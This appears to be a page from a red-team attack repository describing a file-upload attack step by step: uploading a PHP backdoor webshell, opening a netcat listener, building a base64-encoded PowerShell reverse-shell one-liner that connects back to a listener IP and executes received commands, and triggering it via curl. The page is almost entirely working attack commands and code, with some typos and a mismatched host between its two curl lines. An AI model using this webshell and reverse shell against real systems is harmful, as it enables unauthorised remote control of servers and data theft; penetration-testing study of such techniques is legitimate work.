---
title: FileUpload 3
parent: Attack Repository
grand_parent: Red Team
nav_order: 4
---
# Example 3:
# Webshell
1. Select the target file extension (in this case .php, but it could also be .asp, etc.)
```bash
ls -la /usr/share/webshells
```
1. Prepare and upload the PHP file for the reverse shell based on the results from Example 1
```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
# Upload this file
```

3. Prepare Netcat
```bash
nc -nlvp 4444
```

4. Execute the reverse shell using a PowerShell one-liner
```bash
# Launch PowerShell
pwsh
```


```powershell
# Creating a one-liner
$Text = '$client = New-Object System.Net.Sockets.TCPClient(“192.168.50.189”,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + “PS ” + (pwd).Path + “> ”;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText = [Convert]::ToBase64String($Bytes)

$EncodedText

exit
```
5. Execution
```bash
# Append the Base64 string generated above to the following line and send it
# curl http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=powrshell%20-enc%20

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP? cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
